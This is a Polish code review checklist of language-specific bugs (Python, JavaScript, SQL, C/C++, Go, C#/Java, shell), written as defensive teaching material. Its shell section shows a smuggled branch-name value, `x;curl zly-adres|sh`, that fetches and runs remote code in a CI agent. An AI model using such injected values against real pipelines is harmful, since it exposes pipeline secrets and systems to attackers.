# Przegląd według języków — sygnatury usterek specyficzne językowo

Karta rozwija procedurę z `references/przeglad-kodu/przeglad-kodu.md`. Zawiera usterki wynikające z
semantyki konkretnego języka, umykające przeglądającym z innych ekosystemów. Każda pozycja:
**sygnatura → skutek → poprawka**. Stosuj po sprawdzeniach ogólnych z
`references/przeglad-kodu/katalog-usterek.md`, jako listę kontrolną dla języka przeglądanej zmiany.

## Python

1. **Mutowalny argument domyślny.** Sygnatura: `def f(x, wynik=[])`,
   `def f(x, opcje={})`. Skutek: wartość domyślna powstaje raz przy definicji
   i jest współdzielona między wywołaniami — dane z poprzednich wywołań
   przeciekają do następnych; ujawnia się przy drugim wywołaniu. Poprawka:
   `wynik=None` i `wynik = [] if wynik is None else wynik`; w klasach danych
   `field(default_factory=list)`.

2. **Zamknięcie w pętli wiąże zmienną, nie wartość.** Sygnatura: `lambda`
   lub funkcja wewnętrzna w pętli odwołująca się do zmiennej sterującej.
   Skutek: wszystkie zamknięcia widzą ostatnią wartość — każdy przycisk
   wywołuje obsługę ostatniego elementu. Poprawka: zwiąż wartość argumentem
   domyślnym `lambda i=i: obsluz(i)` albo `functools.partial(obsluz, i)`.

3. **Gołe lub zbyt szerokie `except`.** Sygnatura: `except:` albo `except Exception:` z
   `pass`/zwrotem domyślnym. Skutek: gołe `except:` łapie też `KeyboardInterrupt` i `SystemExit`;
   usterki programistyczne (`TypeError`, `KeyError`) maskowane jako „brak danych” — patrz
   `references/przeglad-kodu/katalog-usterek.md` E4. Poprawka: wyjątki konkretne; uzasadniony
   szeroki wychwyt (pętla główna usługi) — `logger.exception` z pełnym śladem.

4. **`is` zamiast `==` do porównań wartości.** Sygnatura: `if x is 5`,
   `if name is "admin"`. Skutek: `is` porównuje tożsamość obiektów — dla
   internowanych wartości bywa przypadkiem prawdziwe, dla innych fałszywe;
   usterka niedeterministyczna. Poprawka: `==` dla wartości; `is` wyłącznie
   dla `None`, `True`, `False` i sentineli.

5. **`open()` bez jawnego kodowania.** Sygnatura: `open(path)` bez
   `encoding=` przy tekście. Skutek: kodowanie zależy od systemu — na Windows
   domyślnie cp1250; plik z „ą/ś/ż” czyta się błędnie na innej maszynie albo
   rzuca `UnicodeDecodeError` we wdrożeniu. Poprawka: zawsze jawne
   `encoding="utf-8"`; dane binarne trybem `"rb"`/`"wb"`.

6. **Prawdziwość zaskakująca: `0`, `""`, pusta kolekcja.** Sygnatura:
   `if not x:` tam, gdzie zero lub pusty tekst są poprawnymi danymi;
   `isinstance(x, int)` przepuszczające `bool`. Skutek: kwota `0` zł
   potraktowana jak brak wartości wchodzi w gałąź błędu; `True` policzone
   jako `1` w agregacji. Poprawka: porównania jawne (`if x is None:`);
   w kontrolach typów wykluczaj `bool`, gdy trzeba.

## JavaScript / TypeScript

1. **`==` zamiast `===`.** Sygnatura: luźne `==`/`!=` poza idiomem
   `x == null`. Skutek: koercja typów — `0 == ""` i `"1" == 1` są prawdziwe;
   walidacja przepuszcza wartości złego typu. Poprawka: `===`/`!==` wszędzie;
   „null lub undefined” przez `x ?? ...`; reguła lintera `eqeqeq`.

2. **`this` w wywołaniu odłączonym od obiektu.** Sygnatura: metoda przekazana
   jako wartość: `addEventListener("click", obj.handler)`,
   `arr.map(obj.metoda)`. Skutek: w chwili wywołania `this` jest `undefined`
   (tryb ścisły) — `TypeError` albo cicha praca na złym stanie. Poprawka:
   strzałka w miejscu wywołania, `bind(obj)` albo pole-strzałka w klasie.

3. **Obietnice porzucone (floating promises).** Sygnatura: wywołanie `async`
   bez `await`/`then`/`.catch`; `forEach(async ...)`. Skutek: błędy giną jako
   nieobsłużone odrzucenia (w Node domyślnie ubijają proces); odpowiedź wraca
   przed zapisem — patrz `references/przeglad-kodu/katalog-usterek.md` C4. Poprawka: `await`;
   zamierzone „odpal i zapomnij” — jawne `void` z własnym `.catch`; pętle
   przez `for...of` z `await` albo `Promise.all`; reguła
   `@typescript-eslint/no-floating-promises`.

4. **`any` przemycane przez granice typów.** Sygnatura: `as any`, adnotacje
   `any`, wyniki `JSON.parse` i `fetch` bez walidacji, `@ts-ignore` bez
   uzasadnienia. Skutek: kompilator milczy, błąd typu ujawnia się w biegu
   daleko od przyczyny. Poprawka: walidacja danych zewnętrznych na granicy
   (schemat — zod lub odpowiednik projektu), `unknown` zamiast `any`, każdy
   `@ts-expect-error` z komentarzem „dlaczego”.

5. **Mutacja stanu współdzielonego przez referencję.** Sygnatura: `sort()`,
   `reverse()`, `splice()`, `push()` na tablicy z zewnątrz lub ze stanu;
   modyfikacja pól obiektu stanu (React/Redux) zamiast utworzenia nowego.
   Skutek: `sort` mutuje w miejscu — „posortowanie kopii” psuje dane
   wywołującego; framework nie wykrywa zmiany (ta sama referencja) i nie
   odświeża widoku. Poprawka: warianty niemutujące (`toSorted`, rozproszenie
   `[...]`/`{...}`, `structuredClone`); stan i argumenty jako `readonly`.

6. **Precyzja liczb i parsowanie.** Sygnatura: kwoty w `Number` (patrz
   `references/przeglad-kodu/katalog-usterek.md` B3), 64-bitowe identyfikatory z API parsowane do
   `Number`, `parseInt` bez podstawy. Skutek: liczby powyżej
   `Number.MAX_SAFE_INTEGER` (2^53−1) tracą precyzję — dwa różne
   identyfikatory stają się równe. Poprawka: identyfikatory jako teksty,
   `BigInt` do arytmetyki wielkich liczb; `parseInt(x, 10)`.

## SQL

1. **NULL w porównaniach — logika trójwartościowa.** Sygnatura: `WHERE
   kolumna = NULL`; `WHERE kolumna != wartość` na kolumnie dopuszczającej
   NULL. Skutek: `x = NULL` nigdy nie jest prawdą — zero wierszy; `x != 'a'`
   pomija wiersze z NULL — raport cicho gubi rekordy. Poprawka: `IS NULL` /
   `IS NOT NULL`; przy nierównościach jawnie `(x != 'a' OR x IS NULL)` albo
   `IS DISTINCT FROM`, gdzie dialekt je wspiera.

2. **`NOT IN` z podzapytaniem zwracającym NULL.** Sygnatura: `WHERE id NOT IN
   (SELECT ref_id ...)` gdy `ref_id` bywa NULL. Skutek: jeden NULL w wyniku
   podzapytania czyni cały warunek niespełnialnym — zero wierszy zamiast
   „wszystkich poza”; wybucha, gdy w danych pierwszy raz trafi się NULL.
   Poprawka: `NOT EXISTS (...)` albo `WHERE ref_id IS NOT NULL`
   w podzapytaniu.

3. **Funkcja na kolumnie w WHERE zabija indeks.** Sygnatura: `WHERE
   DATE(created_at) = ?`, `WHERE LOWER(email) = ?`, niejawna konwersja typu.
   Skutek: silnik nie użyje indeksu — pełny skan; zapytanie zwalnia
   z rozmiarem danych (patrz `references/przeglad-kodu/katalog-usterek.md` D2). Poprawka: warunek
   przedziałem po surowej kolumnie (`created_at >= ? AND created_at < ?`);
   indeks wyrażeniowy albo kolumna znormalizowana przy zapisie; zgodność
   typów parametru i kolumny.

4. **`DISTINCT` maskujący błędne złączenie.** Sygnatura: `SELECT DISTINCT`
   dopisane „bo dublowały się wiersze”. Skutek: przyczyną jest złączenie 1:N
   rozmnażające wiersze — `DISTINCT` ukrywa objaw, a `SUM`/`COUNT` na
   rozmnożonych wierszach liczą wielokrotnie te same wartości; wynik poprawny
   wizualnie, błędny liczbowo. Poprawka: napraw złączenie (właściwy klucz,
   agregacja podzapytaniem przed złączeniem, `EXISTS` przy samym
   filtrowaniu); `DISTINCT` tylko ze świadomym uzasadnieniem.

5. **UPDATE/DELETE bez WHERE lub na złączeniu rozmnażającym.** Sygnatura:
   `UPDATE`/`DELETE` bez `WHERE` w skrypcie naprawczym; `UPDATE` ze
   złączeniem dopasowującym wiele wierszy źródłowych do jednego docelowego.
   Skutek: modyfikacja całej tabeli; przy złączeniu niedeterministyczny wybór
   wartości. Poprawka: `WHERE` zawsze; przed skryptem naprawczym `SELECT`
   z tym samym warunkiem i kontrola liczby wierszy; operacja w transakcji.

## C / C++

1. **Niejasna własność pamięci.** Sygnatura: funkcja zwracająca surowy
   wskaźnik bez dokumentacji, kto zwalnia; wskaźnik na obiekt o krótszym
   czasie życia (element wektora, który może się realokować). Skutek: wyciek,
   podwójne zwolnienie (CWE-415), użycie po zwolnieniu (CWE-416) — awarie
   odległe od przyczyny, podatności wykonywalne. Poprawka: własność wyrażona
   typem: `std::unique_ptr`, `std::shared_ptr` tylko przy realnym
   współdzieleniu; surowy wskaźnik wyłącznie jako pożyczka; RAII dla każdego
   zasobu.

2. **Niezdefiniowane zachowanie traktowane jak „działa”.** Sygnatura:
   przepełnienie `int` ze znakiem, odczyt zmiennej niezainicjalizowanej,
   dostęp poza zakres, naruszenie aliasowania. Skutek: kompilator optymalizuje
   przy założeniu, że UB nie występuje — kod „działający” w debug zmienia
   zachowanie w wydaniu; klasyka: kontrola `if (x + 1 < x)` usuwana przez
   kompilator. Poprawka: jawna kontrola przed operacją lub typy bez znaku;
   inicjalizacja przy deklaracji; przebieg z sanitizerami (ASan/UBSan) dla
   zmian w kodzie wskaźnikowym.

3. **Off-by-one i rozmiary buforów.** Sygnatura: `strcpy`, `sprintf`,
   `strcat`, `gets` (zawsze usterka); kopiowanie do `char buf[N]` bez miejsca
   na terminator; `strncpy` bez dopisania `\0`; pętla `<=` po indeksach.
   Skutek: przepełnienie bufora (CWE-120/121) — od awarii po wykonanie kodu;
   brak terminatora daje odczyt poza bufor przy następnym użyciu. Poprawka:
   funkcje ograniczane z poprawnym rozmiarem (`snprintf`); w C++
   `std::string`, `std::vector`, `std::span`; rozmiar wyprowadzany z obiektu
   (`sizeof buf`, `size()`), nie powtarzany literałem.

4. **Wskaźnik/referencja do obiektu lokalnego.** Sygnatura: `return
   &lokalna;`, zwrot tablicy lokalnej, lambda odroczona przechwytująca
   lokalną przez referencję. Skutek: obiekt niszczony przy wyjściu z funkcji —
   odczyt zwolnionego stosu; bywa, że „działa” do pierwszego przeplotu
   wywołań. Poprawka: zwrot przez wartość (przenoszenie jest tanie), bufor
   wywołującego albo jawna własność (`std::unique_ptr`); lambdy odroczone
   przechwytują przez wartość.

5. **Wyścig na danych bez synchronizacji.** Sygnatura: zmienna czytana
   i pisana z wielu wątków bez `std::atomic` ani mutexu („tylko flaga bool”).
   Skutek: data race jest UB — kompilator może wyhoistować odczyt z pętli
   i pętla nigdy nie zobaczy zmiany flagi; uszkodzenia struktur przy
   współbieżnym zapisie. Poprawka: `std::atomic` dla flag i liczników, mutex
   dla struktur; przekazywanie danych kolejkami; przebieg z ThreadSanitizer
   dla zmian wielowątkowych.

## Go

1. **Ignorowanie `err`.** Sygnatura: `wynik, _ := f()` dla funkcji
   zwracającej błąd; `defer f.Close()` na pliku do zapisu bez kontroli błędu
   zamknięcia. Skutek: operacja padła, kod biegnie dalej z wartością zerową;
   błąd `Close` przy zapisie oznacza niedopisany bufor — plik cicho ucięty.
   Poprawka: obsłuż każdy `err` (`fmt.Errorf("...: %w", err)`, log albo
   udokumentowane ignorowanie); dla zapisów `Close` z kontrolą błędu lub
   `Sync` przed zamknięciem.

2. **Goroutine bez gwarancji zakończenia (wyciek).** Sygnatura: `go func()`
   na kanale, którego druga strona może nigdy nie odebrać; goroutine bez
   `context`; brak `WaitGroup`. Skutek: goroutine wisi na kanale wiecznie —
   z każdym żądaniem przybywa zablokowanych goroutine, proces puchnie do
   restartu. Poprawka: każda goroutine ma drogę zakończenia: `select` na
   `ctx.Done()`, kanały buforowane, gdzie nadawca nie może czekać,
   `WaitGroup`/`errgroup`.

3. **Kopiowanie struktury z mutexem.** Sygnatura: struktura z `sync.Mutex`/
   `sync.WaitGroup` przekazywana przez wartość (`s2 := s1`), metody
   z odbiornikiem wartościowym. Skutek: kopia ma własny mutex — dwie „kopie”
   synchronizują się każda ze sobą, ochrona iluzoryczna. Poprawka: przekazuj
   wskaźnikiem, odbiorniki wskaźnikowe dla typów z blokadami; `go vet`
   (copylocks) w CI jako bramka.

4. **Zmienna pętli współdzielona przez goroutine (Go < 1.22).** Sygnatura:
   `for _, v := range xs { go func() { uzyj(v) }() }` bez przekazania `v`
   argumentem — sprawdź wersję w `go.mod`. Skutek: wszystkie goroutine widzą
   ostatnią wartość — przetwarzają ten sam element N razy. Poprawka: przekaż
   argumentem `go func(v T) {...}(v)`; od Go 1.22 semantyka per-iteracja
   usuwa problem, ale kod ma być poprawny w wersji z `go.mod`.

5. **`nil` mapa i pułapki wartości zerowych.** Sygnatura: zapis do mapy
   niezainicjalizowanej (`var m map[string]int; m[k] = v`); odczyt `m[k]`
   bez formy dwuwartościowej, gdy brak klucza ma znaczenie; interfejs niosący
   typowany nil. Skutek: zapis do nil-mapy to panika; `m[k]` zwraca zero
   także dla klucza nieobecnego; `err != nil` bywa prawdą przy nil-wskaźniku
   wewnątrz interfejsu. Poprawka: `make(...)` przed zapisem; `v, ok := m[k]`;
   zwracaj jawnie `nil` interfejsu, nie typowany wskaźnik nil.

6. **`defer` w pętli.** Sygnatura: `defer f.Close()` wewnątrz pętli
   otwierającej wiele plików/połączeń. Skutek: `defer` wykonuje się przy
   wyjściu z funkcji, nie iteracji — deskryptory kumulują się do wyczerpania
   limitu. Poprawka: wydziel ciało iteracji do funkcji albo zamykaj jawnie
   na końcu iteracji.

## C# / Java

1. **`async void` (C#).** Sygnatura: metoda `async void` poza obsługą zdarzeń
   UI. Skutek: wywołujący nie może czekać ani złapać wyjątku — błąd trafia do
   kontekstu synchronizacji i potrafi ubić proces; testy nie widzą
   niepowodzenia. Poprawka: `async Task` wszędzie poza handlerami zdarzeń;
   wywołujący `await`-uje; analizatory (reguły VSTHRD) w CI.

2. **Wyjątki połykane w executorach i zadaniach.** Sygnatura (Java):
   `executor.submit(...)` bez odczytu `Future.get`; (C#): `Task.Run(...)`
   bez `await` ani kontynuacji z obsługą błędu. Skutek: wyjątek uwięziony
   w `Future`/`Task` — zadanie „działa”, robota nie jest wykonywana,
   dzienniki milczą; w `ScheduledExecutorService` jeden wyjątek trwale
   zatrzymuje zadanie cykliczne. Poprawka: konsumuj wynik (`get`/`await`),
   `try/catch` z logowaniem w ciele zadania, obsługa wyjątków
   nieprzechwyconych na poziomie puli.

3. **Kontrakt `equals`/`hashCode`.** Sygnatura: nadpisane `equals` bez
   `hashCode` (lub odwrotnie); pola mutowalne w skrócie obiektu-klucza; `==`
   na `String`/opakowaniach w Javie. Skutek: obiekt „znika”
   z `HashMap`/`HashSet` — kubełek liczony ze starego skrótu; `==` na
   `Integer` poza pulą −128..127 daje fałsz dla równych wartości — ujawnia
   się na dużych danych. Poprawka: nadpisuj oba spójnie (`Objects.hash`,
   rekordy/`record struct`); klucze kolekcji haszowanych niemutowalne;
   wartości porównuj `equals`.

4. **Zasoby niezwalniane — `IDisposable` / try-with-resources.** Sygnatura
   (C#): `IDisposable` (połączenie, strumień) bez `using`; (Java):
   `InputStream`/`Connection` poza try-with-resources; w `finally` zamknięty
   tylko pierwszy z kilku zasobów. Skutek: wyciek deskryptorów i połączeń —
   pula połączeń bazy wyczerpana pod obciążeniem, usługa staje mimo sprawnej
   bazy. Poprawka: `using`/try-with-resources dla każdego zasobu w zasięgu,
   w którym powstał; wiele zasobów w jednej klauzuli; analizatory (CA2000)
   jako bramka.

5. **Blokowanie na wyniku async — zakleszczenie (C#).** Sygnatura: `.Result`,
   `.Wait()`, `.GetAwaiter().GetResult()` w kodzie z kontekstem
   synchronizacji (UI, klasyczny ASP.NET). Skutek: wątek kontekstu czeka na
   zadanie, które czeka na ten wątek — aplikacja wisi bez śladu w logach.
   Poprawka: async konsekwentnie do samej góry; w bibliotekach
   `ConfigureAwait(false)`; most sync→async — jedno udokumentowane miejsce,
   nie wzorzec.

6. **Leniwe ładowanie ORM poza sesją i N+1.** Sygnatura (Java/Hibernate,
   C#/EF): dostęp do kolekcji leniwej po zamknięciu sesji
   (`LazyInitializationException`); nawigacja po relacjach w pętli — patrz
   `references/przeglad-kodu/katalog-usterek.md` D1. Skutek: wyjątek w warstwie widoku daleko od
   przyczyny albo ciche puste dane; lawina zapytań na produkcji. Poprawka:
   jawne ładowanie w zapytaniu (`JOIN FETCH`, `Include`), projekcje DTO na
   granicy warstw; zakres sesji świadomie zarządzany.

## PowerShell / bash w zadaniach budowy

1. **Kody wyjścia nieobsłużone.** Sygnatura (bash): skrypt bez `set -e`
   i jawnej kontroli `$?`/`||`; błąd w środku potoku niewidoczny bez `set -o
   pipefail`; (PowerShell): programy natywne ustawiają tylko `$LASTEXITCODE`,
   którego nikt nie czyta. Skutek: krok kompilacji padł, potok publikuje
   artefakt poprzedni lub pusty — wdrożenie „udane” bez nowej wersji.
   Poprawka (bash): `set -euo pipefail` + jawne `cmd || true` z komentarzem
   tam, gdzie błąd dopuszczalny; (PowerShell): kontrola `$LASTEXITCODE` po
   każdym programie natywnym, `$ErrorActionPreference = "Stop"` dla cmdletów.

2. **Słowa ze spacjami — brak cudzysłowów wokół zmiennych.** Sygnatura
   (bash): `rm $plik`, `[ -f $sciezka ]`, `for f in $(ls ...)`. Skutek:
   ścieżka `Nowy folder/raport.txt` rozpada się na dwa argumenty — operacja
   na złych plikach; pusta zmienna znika z argumentów i `rm -rf "$KATALOG/"`
   bez cudzysłowu potrafi celować w korzeń. Poprawka: cudzysłowy wokół
   każdego rozwinięcia (`"$plik"`, `"$@"`), iteracja globem lub `find -print0
   | xargs -0`; ShellCheck w CI.

3. **Niebezpieczne rozwinięcia i wstrzyknięcia w skryptach.** Sygnatura:
   `eval`/`Invoke-Expression` na danych z parametrów; parametry zadania CI
   (nazwa gałęzi, opis zmiany) wstawiane wprost do polecenia powłoki
   szablonem potoku. Skutek: nazwa gałęzi `x;curl zly-adres|sh` wykonuje kod
   w agencie z dostępem do sekretów potoku — patrz `references/przeglad-kodu/katalog-usterek.md` A2.
   Poprawka: dane z zewnątrz wyłącznie przez zmienne środowiskowe cytowane
   w powłoce, nigdy wklejane w tekst polecenia; zamiast `eval` — tablice
   argumentów i splatting.

4. **Sekrety w wierszu poleceń i dziennikach budowy.** Sygnatura: token jako
   argument polecenia (widoczny w liście procesów i logu potoku), `set -x`
   w skryptach dotykających sekretów, `echo` zmiennej z kluczem. Skutek:
   sekret trwale w dzienniku budowy dostępnym szerzej niż magazyn sekretów —
   patrz `references/przeglad-kodu/katalog-usterek.md` A8. Poprawka: sekrety przez zmienne
   środowiskowe lub pliki o ograniczonych prawach; maskowanie mechanizmem CI;
   `set +x` wokół fragmentów wrażliwych.

5. **Porównania w PowerShell — pułapki operatorów.** Sygnatura: `-eq` na
   tablicy (filtruje zamiast porównać); konwersja według typu lewego operandu
   (`"10" -gt 9` porównuje tekstowo); domyślna niewrażliwość na wielkość
   liter. Skutek: warunki w skrypcie wdrożeniowym przechodzą lub padają
   wbrew intencji — porównanie wersji tekstowo daje `"10.9" > "10.10"`.
   Poprawka: jawne rzutowanie operandów (`[int]`, `[version]`), `-ceq` przy
   rozróżnianiu wielkości liter, porównania tablic przez `Compare-Object`
   lub `-contains`.
